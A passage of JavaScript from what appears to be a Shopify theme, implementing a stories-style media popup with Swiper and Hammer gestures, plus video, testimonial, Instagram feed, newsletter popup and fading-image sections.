			var firstimg = document.querySelector('#popup img');
			playimg(firstimg, mySwiper);
		}


		// open popup
		setTimeout(function () {

			if (isimage) {
				$this.removeClass('fade');
				$('#popup').addClass('transition');
			}

			//lock scrolling
			$('#body').addClass('popup-open');
			$('#popup video, #popup img')[0].ontouchend = (e) => {
				e.preventDefault();
			};
			var vpH = window.innerHeight;
			document.documentElement.style.height = vpH.toString() + "px";
			stopBodyScrolling(true);

			mySwiper.update();


			//look for swipe
			var currentslide = $(mySwiper.slides[mySwiper.activeIndex]);
			var popup = currentslide.closest('.popup');
			// look for swipe and add or remove class   
			if (currentslide.attr('swipe')) {
				popup.addClass('swipe');
			} else {
				popup.removeClass('swipe');
			}

		}, 0);


		
		// pause videos when holding down
		 jQuery('#popup').find( ".control" ).off("touchstart").on( "touchstart", function( event ) { 
		  event.preventDefault();
		  var currentseconds = new Date().getTime() / 1000; console.log(currentseconds);
		   
		  var currentslide = $(mySwiper.slides[mySwiper.activeIndex]);
		  console.log(currentslide)
		  var video = currentslide.find('video').get(0);
		   if(video) {
		   video.pause();
		   }
		   
		   
		   $(this).off("touchend").on("touchend", function() {
		     var newseconds = new Date().getTime() / 1000; console.log(newseconds);
		     var difference = newseconds - currentseconds;
		     console.log(difference);
		     if(difference < 0.3) {
		       $(this).trigger('click');
		     }else{
		      if(video) {
		        video.play();
		      }
		     }
		   }); 
		 });
		
 


// close popup  
popup.querySelector('.close').addEventListener('click', closepopup );
    
    
    
//popup drag
(function($) {
    $.fn.imgPause = function() {

        // show loading
        var $this = $(this);


        $this.each(function() {
            var img = this;
            img.timer = clearInterval(img.timer);
        })
    }
})(jQuery);
    
    
    
 


    
    function getViewport() {

 var viewPortWidth;
 var viewPortHeight;

 // the more standards compliant browsers (mozilla/netscape/opera/IE7) use window.innerWidth and window.innerHeight
 if (typeof window.innerWidth != 'undefined') {
   viewPortWidth = window.innerWidth,
   viewPortHeight = window.innerHeight
 }

// IE6 in standards compliant mode (i.e. with a valid doctype as the first line in the document)
 else if (typeof document.documentElement != 'undefined'
 && typeof document.documentElement.clientWidth !=
 'undefined' && document.documentElement.clientWidth != 0) {
    viewPortWidth = document.documentElement.clientWidth,
    viewPortHeight = document.documentElement.clientHeight
 }

 // older versions of IE
 else {
   viewPortWidth = document.getElementsByTagName('body')[0].clientWidth,
   viewPortHeight = document.getElementsByTagName('body')[0].clientHeight
 }
 return [viewPortWidth, viewPortHeight];
}
    function getCoords(elem) { // crossbrowser version
    var box = elem.getBoundingClientRect();

    var body = document.body;
    var docEl = document.documentElement;

    var scrollTop = window.pageYOffset || docEl.scrollTop || body.scrollTop;
    var scrollLeft = window.pageXOffset || docEl.scrollLeft || body.scrollLeft;

    var clientTop = docEl.clientTop || body.clientTop || 0;
    var clientLeft = docEl.clientLeft || body.clientLeft || 0;

    var top  = box.top +  scrollTop - clientTop;
    var left = box.left + scrollLeft - clientLeft;

    return { top: Math.round(top), left: Math.round(left) };
}

    
	}       
          
          
          
          
          
          }    
function updateProgress(event) {
  var media = event.target;
  var mediaID = media.id;
   var progressBarID = mediaID.replace('media-','progress-bar-'); 
  var progressBar = document.querySelector('#'+ progressBarID + ' .progressbar');
  // Calculate current progress
if(media.nodeName == 'IMG') {
  var value = (100 / media.endtimer) * media.time;
}else{
  var value = (100 / media.duration) * media.currentTime;
  }  
  // Update the slider value
  progressBar.style.width = value + '%';
}  
function playvideo(videoEl, mySwiper) {
  // activate progress bar
  videoEl.removeEventListener('timeupdate', updateProgress, false);
  videoEl.addEventListener('timeupdate', updateProgress, false);
  
  // remove done
  var videoid = videoEl.id;
  var progressbarid = videoid.replace('media-','progress-bar-');
  var progressbar = $('#' + progressbarid);
  progressbar.removeClass('done');
  //play video
  videoEl.muted= false;
  videoEl.play();
  // check for next video then play next video muted then rewind
  var nextslide = $(videoEl).parent('.swiper-slide').next();
  if(nextslide.length) {
    $(videoEl).off('ended').one('ended',function(){
    //trigger next slide on ended
     mySwiper.slideNext();  
      
   });
    var nextvideo = nextslide.find('video').get(0);
    // mute and play
    nextvideo.muted= true;
    nextvideo.oncanplay = (event) => {
      // pause rewind unmute
      nextvideo.muted= false;
     // nextvideo.currentTime = 0;
    };
    // stop when playable then rewind and wait
    
  }else{
     $(videoEl).off('ended').one('ended',function(){
     // close popup
     closepopup();
    });
  }
}
function convertimagestomp4(mySwiper) {


  $(mySwiper.$wrapperEl[0]).find('img').each(function() {
    var img = $(this)[0];
    img.endtimer = 5;
    img.time = 0;
    img.updateTime = function() {
      if (img.time < img.endtimer) {
      img.time = img.time + 0.250;
         $(img).trigger('timeupdate');
        if(img.time == img.endtimer) {
         $(img).trigger('ended');
        }
      }else{
       clearInterval(img.timer)
      }
    };
   
  });

}          
function stopBodyScrolling (bool) {
    if (bool === true) {
        document.body.addEventListener("touchmove", freezeVp, false);
        popup.addEventListener("touchmove", freezeVp, false);
    } else {
        document.body.removeEventListener("touchmove", freezeVp, false);
        popup.addEventListener("touchmove", freezeVp, false);
    }
}
var freezeVp = function(e) {
    e.preventDefault();
};          
function closepopup() {

      var videos = popup.querySelectorAll('video');
  [].forEach.call(videos, function(video) {
  video.pause();
});
     popup.classList.add('transitout');
     popup.classList.remove('transition');
     setTimeout(function() {  
         popup.classList.remove('transitout')
         popup.classList.remove('active')
    document.body.classList.add('popup-open');
       stopBodyScrolling(false); 
       mySwiper.setProgress(0,0);
       }, 300);
}             
function setup_swiper_rules(mySwiper) {
  mySwiper.on('init', function () {
   var currentslide = $(mySwiper.slides[mySwiper.activeIndex]);
  });
  mySwiper.on('slideChange', function (event) {
    var currentslide = $(mySwiper.slides[mySwiper.activeIndex]);
    var nextvideo = currentslide.find('video').get(0);
  if(nextvideo) { 
  // pause other videos 
  currentslide.siblings().find('video').each(function() {
   var video = $(this).get(0);
   video.currentTime = 0; 
   video.pause();
   video.muted = true;
  });

   // fill previous bar
  currentslide.prevAll().find('video').each(function() {
     var videoid = $(this).attr('id');
     var progressbarid = videoid.replace('media-','progress-bar-');
     var progressbarwrap = $('#' + progressbarid);
     progressbarwrap.addClass('done');
  });
    // play video
    playvideo(nextvideo,mySwiper);
}
// image rules  
 var nextimg = currentslide.find('img').get(0); 
   if(nextimg) { 
   // pause other videos 
   currentslide.siblings().find('img').each(function() {
   var img = $(this).get(0);
   $(img).imgPause();   
   img.time = 0; 
   $(img).trigger('timeupdate');
  });
   // fill previous bar
  currentslide.prevAll().find('img').each(function() {
     var imgid = $(this).attr('id');
     var progressbarid = imgid.replace('media-','progress-bar-');
     var progressbarwrap = $('#' + progressbarid);
     progressbarwrap.addClass('done');
  });
    // play video
    playimg(nextimg,mySwiper);
   var popup = currentslide.closest('.popup');
 // look for swipe and add or remove class   
    if(currentslide.attr('swipe')) {
      popup.addClass('swipe');
    }else{
      popup.removeClass('swipe');
    }    
} 
}); 
mySwiper.init();   
}
function create_swiper() {
	var container = document.querySelector('#popup .swiper-container');
	// shoutouts swiper
	var mySwiper = new Swiper(container, {
		speed: 0,
		slidesPerView: 1, // or 'auto'
		// spaceBetween: 10,
		effect: 'slide', // 'cube', 'fade', 'coverflow',
		preventClicks: true,
		slideToClickedSlide: false,
		grabCursor: true,
        observer: true,
        navigation: {
          nextEl: '#NavRight',
          prevEl: '#NavLeft'
        },
      init: false,
	})
    return mySwiper;
}
          function addPopup() {      
    const markup =  `<div class="popup-inner">
		<div class="close" aria-hidden="true">
			<svg xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" width="50" height="50" viewBox="0 0 50 50" style="fill:#fff;">
				<g id="surface1">
					<path style=" " d="M 14.40625 13 L 13 14.40625 L 23.625 25 L 13 35.59375 L 14.40625 37 L 25.0625 26.40625 L 35.6875 37 L 37.09375 35.59375 L 26.46875 25 L 37.09375 14.40625 L 35.6875 13 L 25.0625 23.59375 Z "> </path>
				</g>
			</svg>
		</div>
		<div id="progress-bars-wrap"> </div>
		<div id="NavLeft" class="control left"> </div>
		<div id="NavRight" class="control right"> </div>
		<div class="story-profile">
			<div class="story-profile-pic">
				<div> </div>
			</div>
			<div class="story-profile-content"> </div>
		</div>
		<div id="swipe" style="opacity:0;">
			<div class="arrows">
				<svg width="669pt" height="1151pt" viewBox="0 0 669 1151" version="1.1" xmlns="http://www.w3.org/2000/svg">
					<g id="arrow1" opacity="1" transform="translate(0,0)">
						<path fill="#ffffff" opacity="1" d=" M 323.44 179.52 C 332.65 174.88 344.63 176.71 351.95 184.01 C 454.69 285.94 557.42 387.89 660.15 489.82 C 667.74 496.79 670.18 508.61 666.01 518.02 C 664.40 522.06 661.41 525.31 658.30 528.27 C 645.11 541.42 631.97 554.63 618.77 567.77 C 609.61 576.78 593.46 576.71 584.35 567.64 C 501.06 485.17 417.76 402.71 334.51 320.19 C 251.25 402.68 167.96 485.15 84.67 567.62 C 75.57 576.71 59.39 576.79 50.22 567.76 C 36.04 553.61 21.86 539.45 7.72 525.26 C -1.47 515.92 -1.17 499.36 8.33 490.35 C 108.70 390.71 209.12 291.13 309.49 191.49 C 314.05 187.41 317.77 182.18 323.44 179.52 Z" />
					</g>
					<g id="arrow2" opacity="1" transform="translate(0,0)">
						<path fill="#ffffff" opacity="1" d=" M 316.30 585.25 C 319.46 581.99 323.46 579.50 327.87 578.35 C 335.44 577.33 343.93 577.47 350.00 582.81 C 358.67 590.85 366.83 599.43 375.31 607.68 C 469.85 701.50 564.40 795.31 658.95 889.12 C 662.07 892.02 664.83 895.43 666.32 899.47 C 669.86 908.36 667.78 919.21 661.03 926.02 C 646.86 940.19 632.72 954.38 618.52 968.51 C 608.85 977.78 591.92 976.94 583.08 966.91 C 500.25 884.82 417.33 802.80 334.51 720.69 C 251.34 803.09 168.13 885.46 84.95 967.85 C 75.46 977.68 58.02 977.26 48.96 967.05 C 35.17 953.18 21.27 939.41 7.50 925.52 C -1.37 916.24 -1.11 900.10 8.07 891.12 C 110.78 789.13 213.56 687.21 316.30 585.25 Z" />
					</g>
					<animateTransform attributeName="transform" type="translate" from="0 0" to="0 -200" dur="1.4s" values="0 0 ; 0 -200 ; 0 200 ; 0 0 ; 0 0" keyTimes="0; 0.35; 0.364; 0.77; 1" repeatCount="indefinite" xlink:href="#arrow1" />
					<animateTransform attributeName="transform" type="scale" from="1" to="1" dur="1.4s" values="1 ; 0.9 ; 0.9 ; 1 ; 1" keyTimes="0; 0.35; 0.364; 0.77; 1" repeatCount="indefinite" xlink:href="#arrow1" additive="sum" />
					<animate attributeType="CSS" attributeName="opacity" from="1" to="0" dur="1.4s" values="1 ; 0 ; 0 ; 1 ; 1" keyTimes="0; 0.35; 0.364; 0.77; 1" repeatCount="indefinite" xlink:href="#arrow1" />
					<animateTransform attributeName="transform" type="translate" from="0 0" to="0 -200" dur="1.4s" begin="0.2s" values="0 0 ; 0 -200 ; 0 200 ; 0 0 ; 0 0" keyTimes="0; 0.35; 0.364; 0.77; 1" repeatCount="indefinite" xlink:href="#arrow2" />
					<animateTransform attributeName="transform" type="scale" from="1" to="1" dur="1.4s" begin="0.2s" values="1 ; 0.9 ; 0.9 ; 1 ; 1" keyTimes="0; 0.35; 0.364; 0.77; 1" repeatCount="indefinite" xlink:href="#arrow2" additive="sum" />
					<animate attributeType="CSS" attributeName="opacity" from="1" to="0" dur="1.4s" begin="0.2s" values="1 ; 0 ; 0 ; 1 ; 1" keyTimes="0; 0.35; 0.364; 0.77; 1" repeatCount="indefinite" xlink:href="#arrow2" /> </svg>
			</div> Swipe up to view </div>
		<div class="shadow"></div>
		<div class="swiper-container">
			<div class="swiper-wrapper">
				<div class="swiper-slide"> </div>
			</div>
		</div>
	</div>
	<div id="popup-overlay"> </div>`;
 let popup = document.createElement("div");           
 popup.id = 'popup';     
 popup.classList.add('popup');
 popup.innerHTML = markup;           
 document.body.prepend(popup);    
function dragPopup() {
           var sliderEl =  document.querySelector('#popup .popup-inner'); 
          if(!sliderEl.hammer) {
            var mc = new Hammer(sliderEl);
            sliderEl.hammer = mc;
            var wrap = $(sliderEl).closest('.popup-inner');
            var overlay = wrap.siblings('#popup-overlay');
            var popup = wrap.parent('#popup');
     
           
            mc.on("panleft panright panup pandown press", function(e) {
           
             // find current slide and check for swipe attribute
             var theSwiper = popup.find('.swiper-container')[0].swiper;
             var currentslide = $(theSwiper.slides[theSwiper.activeIndex]);
             
              var controlheight = window.innerHeight / 2;
              var percentage = 100 / 1 * e.deltaY / window.innerHeight; // NEW: our % calc
              var halfpercentage = percentage / 2;
              var absnumber = 100 - halfpercentage;
              var absnumberdec = absnumber.toFixed(1) / 100;
              overlay.get(0).style.opacity = absnumberdec;
              if(halfpercentage > 0) {
              wrap.get(0).style.transform = 'translateY(' + halfpercentage + '%)'; // NEW: our CSS transform
              }
              if (e.isFinal) { // NEW: this only runs on event end
                console.log(percentage);
                if (percentage > 30) {
                
                   closepopup();
                   popup.addClass('is-animating');
                  wrap.get(0).style.transform = 'translateY(0%)';
                  overlay.get(0).style.opacity = 1;
                  popup.get(0).timer = setTimeout( function() {
                        popup.removeClass('is-animating');
                        wrap.find('.swiper-wrapper').empty();
                  }, 300 ); 
                } else if (percentage < -30) {

                  // if has swipe attribute
                  if(currentslide.attr('swipe')) {
                  // swiped up
                   closepopup();
                   popup.addClass('is-animating');
                  wrap.get(0).style.transform = 'translateY(0%)';
                  overlay.get(0).style.opacity = 1;
                  
                  window.location.href =  currentslide.attr('swipe');
                  

                  popup.get(0).timer = setTimeout( function() {
                        popup.removeClass('is-animating');
                        wrap.find('.swiper-wrapper').empty();
                  }, 300 ); 
                    }
                  
                  
                }else{
                  popup.addClass('is-animating');
                  wrap.get(0).style.transform = 'translateY(0%)';
                  overlay.get(0).style.opacity = 1;
                  popup.get(0).timer = setTimeout( function() {
                        popup.removeClass('is-animating');
                  }, 300 ); 
                }
              }
          
            }); 
            }  
}              
 dragPopup();               
           return popup;
          }
         
          
        }
      });
	  //
      return StoriesSection;
    })();
  
  

    theme.VideoSection = (function() {
        var youtubeReady;
        var videos = [];
        var youtubePlayers = [];
        var youtubeVideoOptions = {
            width: 1280,
            height: 720,
            playerVars: {
                autohide: 0,
                branding: 0,
                cc_load_policy: 0,
                controls: 0,
                fs: 0,
                iv_load_policy: 3,
                modestbranding: 1,
                playsinline: 1,
                quality: 'hd720',
                rel: 0,
                showinfo: 0,
                wmode: 'opaque'
            },
            events: {
                onReady: onVideoPlayerReady,
                onStateChange: onVideoStateChange
            }
        };

        var vimeoReady = false;
        var vimeoVideoOptions = {
            byline: false,
            title: false,
            portrait: false,
            loop: true
        };

        var selectors = {
            videoParent: '.video-parent-section'
        };

        var classes = {
            loading: 'loading',
            loaded: 'loaded',
            interactable: 'video-interactable'
        };

        function videoSection(container) {
            var $container = this.$container = $(container);
            var sectionId = this.sectionId = $container.attr('data-section-id');
            var youtubePlayerId = this.youtubePlayerId = 'YouTubeVideo-' + this.sectionId;
            this.namespace = '.' + youtubePlayerId;
            var vimeoPlayerId = this.vimeoPlayerId = 'Vimeo-' + this.sectionId;
            var $vimeoTrigger = this.$vimeoTrigger = $('#VimeoTrigger-' + this.sectionId);
            var mp4Video = 'Mp4Video-' + this.sectionId;

            var $youtubeDiv = $('#' + youtubePlayerId);
            var $vimeoDiv = $('#' + vimeoPlayerId);
            var $mp4Div = $('#' + mp4Video);

            this.vimeoPlayer = [];

            if ($youtubeDiv.length) {
                this.youtubeVideoId = $youtubeDiv.data('video-id');
                this.initYoutubeVideo();
            }

            if ($vimeoDiv.length) {
                this.vimeoVideoId = $vimeoDiv.data('video-id');
                this.initVimeoVideo();
            }

            if ($mp4Div.length) {
                setParentAsLoaded($mp4Div);

                startMp4Playback(mp4Video).then(function() {
                    // Video played as expected, don't do anything
                }).catch(function(error) {
                    // Video cannot be played with autoplay, so let
                    // user interact with video element itself
                    setVideoToBeInteractedWith($mp4Div);
                })
            }
        }

        function startMp4Playback(mp4Video) {
            return document.querySelector('#' + mp4Video).play();
        }

        function onVideoPlayerReady(evt) {
            var $player = $(evt.target.a);
            var playerId = $player.attr('id');
            youtubePlayers[playerId] = evt.target; // update stored player
            var player = youtubePlayers[playerId];

            setParentAsLoading($player);

            youtubePlayers[playerId].mute();

            // Remove from tabindex because YouTube iframes are annoying and you can focus
            // on the YouTube logo and it breaks
            $player.attr('tabindex', '-1');

            // Add out of view pausing
            videoVisibilityCheck(playerId);
            $(window).on('scroll.' + playerId, {
                id: playerId
            }, $.throttle(150, videoVisibilityCheck));
        }

        function videoVisibilityCheck(id) {
            var playerId;

            if (typeof id === 'string') {
                playerId = id;
            } else {
                // Data comes in as part of the scroll event
                playerId = id.data ? id.data.id : false;
            }

            if (playerId) {
                if (theme.isElementVisible($('#' + playerId))) {
                    playVisibleVideo(playerId);
                } else {
                    pauseHiddenVideo(playerId);
                }
            }
        }

        function playVisibleVideo(id) {
            if (youtubePlayers[id] && typeof youtubePlayers[id].playVideo === 'function') {
                youtubePlayers[id].playVideo();
            }
        }

        function pauseHiddenVideo(id) {
            if (youtubePlayers[id] && typeof youtubePlayers[id].pauseVideo === 'function') {
                youtubePlayers[id].pauseVideo();
            }
        }

        function onVideoStateChange(evt) {
            var $player = $(evt.target.a);
            var playerId = $player.attr('id');
            var player = youtubePlayers[playerId];

            switch (evt.data) {
                case -1: // unstarted
                    // Handle low power state on iOS by checking if
                    // video is reset to unplayed after attempting to buffer
                    if (videos[playerId].attemptedToPlay) {
                        setParentAsLoaded($player);
                        setVideoToBeInteractedWith($player);
                    }
                    break;
                case 0: // ended
                    player.playVideo();
                    break;
                case 1: // playing
                    setParentAsLoaded($player);
                    break;
                case 3: // buffering
                    videos[playerId].attemptedToPlay = true;
                    break;
            }
        }

        function setParentAsLoading($el) {
            $el
                .closest(selectors.videoParent)
                .addClass(classes.loading);
        }

        function setParentAsLoaded($el) {
            $el
                .closest(selectors.videoParent)
                .removeClass(classes.loading)
                .addClass(classes.loaded);
        }

        function setVideoToBeInteractedWith($el) {
            $el
                .closest(selectors.videoParent)
                .addClass(classes.interactable);
        }

        videoSection.prototype = $.extend({}, videoSection.prototype, {
            initYoutubeVideo: function() {
                videos[this.youtubePlayerId] = {
                    id: this.youtubePlayerId,
                    videoId: this.youtubeVideoId,
                    type: 'youtube',
                    attemptedToPlay: false
                };

                if (!youtubeReady) {
                    window.loadYouTube();
                    $('body').on('youTubeReady' + this.namespace, this.loadYoutubeVideo.bind(this));
                } else {
                    this.loadYoutubeVideo();
                }
            },

            loadYoutubeVideo: function() {
                var args = $.extend({}, youtubeVideoOptions, videos[this.youtubePlayerId]);
                args.playerVars.controls = 0;
                youtubePlayers[this.youtubePlayerId] = new YT.Player(this.youtubePlayerId, args);

                youtubeReady = true;
            },

            initVimeoVideo: function() {
                videos[this.vimeoPlayerId] = {
                    divId: this.vimeoPlayerId,
                    id: this.vimeoVideoId,
                    type: 'vimeo'
                };

                var $player = $('#' + this.vimeoPlayerId);
                setParentAsLoading($player);

                // Button to play video on mobile
                this.$vimeoTrigger.on('click', +this.namespace, function(evt) {
                    // $(evt.currentTarget).addClass('hide');
                    this.requestToPlayVimeoVideo(this.vimeoPlayerId);
                }.bind(this));

                if (!vimeoReady) {
                    window.loadVimeo();
                    $('body').on('vimeoReady' + this.namespace, this.loadVimeoVideo.bind(this));
                } else {
                    this.loadVimeoVideo();
                }
            },

            loadVimeoVideo: function() {
                var args = $.extend({}, vimeoVideoOptions, videos[this.vimeoPlayerId]);
                this.vimeoPlayer[this.vimeoPlayerId] = new Vimeo.Player(videos[this.vimeoPlayerId].divId, args);

                vimeoReady = true;

                // Only autoplay on larger screens
                if (!theme.config.bpSmall) {
                    this.requestToPlayVimeoVideo(this.vimeoPlayerId);
                } else {
                    var $player = $('#' + this.vimeoPlayerId);
                    setParentAsLoaded($player);
                }
            },

            requestToPlayVimeoVideo: function(id) {
                // The slider may initialize and attempt to play the video before
                // the API is even ready, because it sucks.

                if (!vimeoReady) {
                    // Wait for the trigger, then play it
                    $('body').on('vimeoReady' + this.namespace, function() {
                        this.playVimeoVideo(id);
                    }.bind(this))
                    return;
                }

                this.playVimeoVideo(id);
            },

            playVimeoVideo: function(id) {
                this.vimeoPlayer[id].play();
                this.vimeoPlayer[id].setVolume(0);

                var $player = $('#' + id);
                setParentAsLoaded($player);
            },

            onUnload: function(evt) {
                var sectionId = evt.target.id.replace('shopify-section-', '');
                var playerId = 'YouTubeVideo-' + sectionId;
                youtubePlayers[playerId].destroy();
                $(window).off('scroll' + this.namespace);
                $('body').off('vimeoReady' + this.namespace);
            }
        });

        return videoSection;
    })();

    theme.BackgroundImage = (function() {

        var selectors = {
            parallaxContainer: '.parallax-container'
        };

        function backgroundImage(container) {
            var $container = $(container);
            var sectionId = $container.attr('data-section-id');
            this.namespace = '.' + sectionId;

            if (!$container.length) {
                return;
            }

            if ($container.data('parallax')) {
                var $parallaxContainer = $container.find(selectors.parallaxContainer);
                var args = {
                    namespace: this.namespace,
                    desktopOnly: true
                };

                theme.parallaxSections[this.namespace] = new theme.Parallax($parallaxContainer, args);
            }
        }

        backgroundImage.prototype = $.extend({}, backgroundImage.prototype, {
            onUnload: function(evt) {
                theme.parallaxSections[this.namespace].destroy();
                delete theme.parallaxSections[this.namespace];
            }
        });

        return backgroundImage;
    })();

    theme.Testimonials = (function() {
        var slideCount = 0;
        var defaults = {
            accessibility: true,
            arrows: false,
            dots: true,
            autoplay: false,
            touchThreshold: 20,
            slidesToShow: 3,
            slidesToScroll: 3
        };

        function Testimonials(container) {
            var $container = this.$container = $(container);
            var sectionId = $container.attr('data-section-id');
            var wrapper = this.wrapper = '.testimonials-wrapper';
            var slider = this.slider = '#Testimonials-' + sectionId;
            var $slider = $(slider);

            this.sliderActive = false;
            var mobileOptions = $.extend({}, defaults, {
                slidesToShow: 1,
                slidesToScroll: 1,
                adaptiveHeight: true
            });

            slideCount = $slider.data('count');

            // Override slidesToShow/Scroll if there are not enough blocks
            if (slideCount < defaults.slidesToShow) {
                defaults.slidesToShow = slideCount;
                defaults.slidesToScroll = slideCount;
            }

            $slider.on('init', this.a11y.bind(this));

            if (theme.config.bpSmall) {
                this.init($slider, mobileOptions);
            } else {
                this.init($slider, defaults);
            }

            $('body').on('matchSmall', function() {
                this.init($slider, mobileOptions);
            }.bind(this));

            $('body').on('matchLarge', function() {
                this.init($slider, defaults);
            }.bind(this));
        }

        Testimonials.prototype = $.extend({}, Testimonials.prototype, {
            onUnload: function() {
                $(this.slider, this.wrapper).slick('unslick');
            },

            onBlockSelect: function(evt) {
                // Ignore the cloned version
                var $slide = $('.testimonials-slide--' + evt.detail.blockId + ':not(.slick-cloned)');
                var slideIndex = $slide.data('slick-index');

                // Go to selected slide, pause autoplay
                $(this.slider, this.wrapper).slick('slickGoTo', slideIndex);
            },

            init: function(obj, args) {
                if (this.sliderActive) {
                    obj.slick('unslick');
                    this.sliderActive = false;
                }

                obj.slick(args);
                this.sliderActive = true;

                if (AOS) {
                    AOS.refresh();
                }
            },

            a11y: function(event, obj) {
                var $list = obj.$list;
                var $wrapper = $(this.wrapper, this.$container);

                // Remove default Slick aria-live attr until slider is focused
                $list.removeAttr('aria-live');

                // When an element in the slider is focused set aria-live
                $wrapper.on('focusin', function(evt) {
                    if ($wrapper.has(evt.target).length) {
                        $list.attr('aria-live', 'polite');
                    }
                });

                // Remove aria-live
                $wrapper.on('focusout', function(evt) {
                    if ($wrapper.has(evt.target).length) {
                        $list.removeAttr('aria-live');
                    }
                });
            }
        });

        return Testimonials;
    })();

    theme.Instagram = (function() {
        var isInit = false;

        function Instagram(container) {
            var $container = this.$container = $(container);
            var sectionId = $container.attr('data-section-id');
            this.namespace = '.instagram-' + sectionId;
            this.$target = $('#Instafeed-' + sectionId);

            if (!this.$target.length) {
                return;
            }

            this.checkVisibility();
            $(window).on('scroll' + this.namespace, $.throttle(100, this.checkVisibility.bind(this)));
        }

        Instagram.prototype = $.extend({}, Instagram.prototype, {
            checkVisibility: function() {
                if (isInit) {
                    $(window).off('scroll' + this.namespace);
                    return;
                }

                if (theme.isElementVisible(this.$container)) {
                    this.init();
                }
            },

            init: function() {
                isInit = true;

                var userId = this.$target.data('user-id');
                var clientId = this.$target.data('client-id');
                var count = parseInt(this.$target.data('count'));
                var gridItemWidth = this.$target.data('grid-item-width');

                // Ask for 2 more images than we'll actually show because
                // Instagram sometimes doesn't send enough
                var feed = this.feed = new Instafeed({
                    target: this.$target[0],
                    accessToken: clientId,
                    get: 'user',
                    userId: userId,
                    limit: count + 2,
                    template: '<div class="grid__item ' + gridItemWidth + '"><div class="image-wrap"><a href="{{link}}" target="_blank" style="background-image: url({{image}}); display: block; padding-bottom: 100%; background-size: cover; background-position: center;"></a></div></div>',
                    resolution: 'standard_resolution'
                });

                feed.run();
            }
        });

        return Instagram;
    })();


    theme.NewsletterPopup = (function() {
        function NewsletterPopup(container) {
            var $container = this.$container = $(container);
            var sectionId = $container.attr('data-section-id');
            this.cookieName = 'newsletter-' + sectionId;

            if (!$container.length) {
                return;
            }

            this.data = {
                secondsBeforeShow: $container.data('delay-seconds'),
                daysBeforeReappear: $container.data('delay-days'),
                cookie: Cookies.get(this.cookieName),
                testMode: $container.data('test-mode')
            };

            this.modal = new theme.Modals('NewsletterPopup-' + sectionId, 'newsletter-popup-modal');

            // Open modal if errors or success message exist
            if ($container.find('.errors').length || $container.find('.note--success').length) {
                this.modal.open();
            }

            // Set cookie as opened if success message
            if ($container.find('.note--success').length) {
                this.closePopup(true);
                return;
            }

            $('body').on('modalClose.' + $container.attr('id'), this.closePopup.bind(this));

            if (!this.data.cookie || this.data.testMode) {
                this.initPopupDelay();
            }
        }

        NewsletterPopup.prototype = $.extend({}, NewsletterPopup.prototype, {
            initPopupDelay: function() {
                setTimeout(function() {
                    this.modal.open();
                }.bind(this), this.data.secondsBeforeShow * 1000);
            },

            closePopup: function(success) {
                // Remove a cookie in case it was set in test mode
                if (this.data.testMode) {
                    Cookies.remove(this.cookieName, {
                        path: '/'
                    });
                    return;
                }

                var expiry = success ? 200 : this.data.daysBeforeReappear;

                Cookies.set(this.cookieName, 'opened', {
                    path: '/',
                    expires: expiry
                });
            },

            onLoad: function() {
                this.modal.open();
            },

            onSelect: function() {
                this.modal.open();
            },

            onDeselect: function() {
                this.modal.close();
            },

            onUnload: function() {}
        });

        return NewsletterPopup;
    })();

    theme.FadingImages = (function() {

        var classes = {
            activeImage: 'active-image',
            finishedImage: 'finished-image',
            activeTitles: 'active-titles',
            finishedTitles: 'finished-titles',
            compensation: 'compensation'
        };

        function FadingImages(container) {
            var $container = this.$container = $(container);
            var sectionId = $container.attr('data-section-id');
            var namespace = this.namespace = '.fading-images-' + sectionId;

            if (!$container.length) {
                return;
            }

            var $imageContainer = $container.find('.fading-images');
            theme.loadImageSection($imageContainer);

            this.data = {
                isInit: false,
                interval: $container.data('interval'),
                block_count: $container.data('count'),
                finish_interval: 1000,
                timer_offset: 400,
                active_image: 1,
                active_title: 1,
                removed_compensation: false
            };

            this.selectors = {
                $allTitles: $container.find('.fading-images-overlay__titles')
            };

            this.checkVisibility();
            $(window).on('scroll' + this.namespace, $.throttle(100, this.checkVisibility.bind(this)));
        }

        FadingImages.prototype = $.extend({}, FadingImages.prototype, {
            checkVisibility: function() {
                if (this.data.isInit) {
                    $(window).off('scroll' + this.namespace);
                    return;
                }

                if (theme.isElementVisible(this.$container)) {
                    this.startImages();
                    this.startTitles();
                    this.data.isInit = true;
                }
            },

            nextImage: function() {
                var $container = this.$container;

                if (!this.data.removed_compensation) {
                    $container.find('.fading-images__item[data-slide-index=' + this.data.active_image + ']').removeClass(classes.compensation);
                    this.data.removed_compensation = true;
                }

                $container
                    .find('.fading-images__item[data-slide-index=' + this.data.active_image + ']')
                    .removeClass(classes.activeImage)
                    .addClass(classes.finishedImage);

                var target_image = this.data.active_image;
                window.setTimeout(function() {
                    $container.find('.fading-images__item[data-slide-index=' + target_image + ']').removeClass(classes.finishedImage);
                }, this.data.finish_interval);

                this.data.active_image++;
                if (this.data.active_image > this.data.block_count) {
                    this.data.active_image = 1;
                }

                $container.find('.fading-images__item[data-slide-index=' + this.data.active_image + ']').addClass(classes.activeImage);
            },

            nextTitle: function() {
                var $container = this.$container;
                var $allTitles = this.selectors.$allTitles;

                this.selectors.$allTitles.removeClass(classes.activeTitles).addClass(classes.finishedTitles);

                this.data.active_title++;
                if (this.data.active_title > this.data.block_count) {
                    this.data.active_title = 1;
                }

                var target_title = this.data.active_title;
                window.setTimeout(function() {
                    var newText1 = $container.find('.fading-images__item[data-slide-index=' + target_title + ']').attr('data-slide-title1');
                    var newText2 = $container.find('.fading-images__item[data-slide-index=' + target_title + ']').attr('data-slide-title2');
                    $container.find('.fading-images-overlay__title--1').text(newText1);
                    $container.find('.fading-images-overlay__title--2').text(newText2);
                    $allTitles.removeClass(classes.finishedTitles).addClass(classes.activeTitles);
                }, this.data.finish_interval - 200);
            },

            startImages: function() {
                // Prep and show first image
                this.$container.find('.fading-images__item[data-slide-index=' + this.data.active_image + ']').addClass(classes.activeImage).addClass(classes.compensation);

                // Begin timer
                var o = this;
                window.setTimeout(function() {
                    var fading_images_timer = window.setInterval(o.nextImage.bind(o), o.data.interval);
                }, this.data.timer_offset);
            },

            startTitles: function() {
                var $container = this.$container;
                var $allTitles = this.selectors.$allTitles;
                // Prep and show first titles
                var target_title = this.data.active_title;
                window.setTimeout(function() {
                    var newText1 = $container.find('.fading-images__item[data-slide-index=' + target_title + ']').attr('data-slide-title1');
                    var newText2 = $container.find('.fading-images__item[data-slide-index=' + target_title + ']').attr('data-slide-title2');
                    $container.find('.fading-images-overlay__title--1').text(newText1);
                    $container.find('.fading-images-overlay__title--2').text(newText2);
                    $allTitles.addClass(classes.activeTitles);
                }, 750);

                // Begin timer
